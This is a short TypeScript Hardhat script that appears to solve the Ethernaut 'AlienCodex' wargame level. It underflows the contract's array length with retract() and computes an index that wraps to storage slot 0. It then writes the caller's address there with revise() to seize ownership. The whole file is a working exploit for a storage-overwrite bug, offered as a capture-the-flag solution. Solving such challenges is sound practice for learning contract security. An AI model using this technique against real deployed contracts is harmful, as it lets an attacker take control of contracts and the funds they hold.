import { BigNumber } from "ethers";
import { keccak256 } from "ethers/lib/utils";
import { ethers } from "hardhat";
import * as helper from "./helpful_scripts";

async function main() {
    const [account] = await ethers.getSigners();
    const alien = await helper.getContractAt("AlienCodex", "0x576D705dC612a82b45442E83C29282A48a3e3f18");

    await helper.waitForTx(alien.make_contact());
    await helper.waitForTx(alien.retract());

    const bigTwo = BigNumber.from(2);
    const max = bigTwo.pow(BigNumber.from(256));

    const oneHex = ethers.utils.hexZeroPad("0x01", 32);
    const kek = BigNumber.from(keccak256(oneHex));

    const index = max.sub(kek);
    const addr = ethers.utils.hexZeroPad(account.address, 32);

    await helper.waitForTx(alien.revise(index, addr));

    console.log(account.address);
    console.log(await alien.owner());
}

main()
    .then(() => process.exit(0))
    .catch((error) => {
        console.error(error);
        process.exit(1);
    });


